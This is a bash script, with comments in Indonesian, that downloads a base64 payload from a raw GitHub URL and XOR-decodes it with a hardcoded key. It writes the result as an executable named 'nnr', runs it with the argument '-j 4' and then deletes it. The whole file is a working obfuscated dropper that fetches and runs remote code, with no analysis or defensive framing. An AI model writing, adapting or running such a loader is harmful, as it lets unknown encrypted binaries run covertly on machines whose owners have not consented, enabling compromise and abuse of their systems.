#!/bin/bash

_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)

if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi

echo "Payload downloaded (length: ${#_PAYLOAD})"

# Simpan ke file sementara
echo "$_PAYLOAD" > /tmp/payload_temp.txt

# Jalankan Python dengan file
python3 <<'PYTHON_SCRIPT'
import base64, os, subprocess

with open('/tmp/payload_temp.txt', 'r') as f:
    data = f.read().strip()

try:
    decoded = base64.b64decode(data)
except Exception as e:
    print(f"Base64 decode error: {e}")
    exit(1)

key = "kembang"
decrypted = bytes([decoded[i] ^ ord(key[i % len(key)]) for i in range(len(decoded))])

if len(decrypted) == 0:
    print("Error: Decrypted data is empty")
    exit(1)

print(f"Decrypted size: {len(decrypted)} bytes")

with open("nnr", "wb") as f:
    f.write(decrypted)

os.chmod("nnr", 0o755)
subprocess.run(["./nnr", "-j", "4"])
os.unlink("nnr")
PYTHON_SCRIPT

# Cleanup
rm -f /tmp/payload_temp.txt
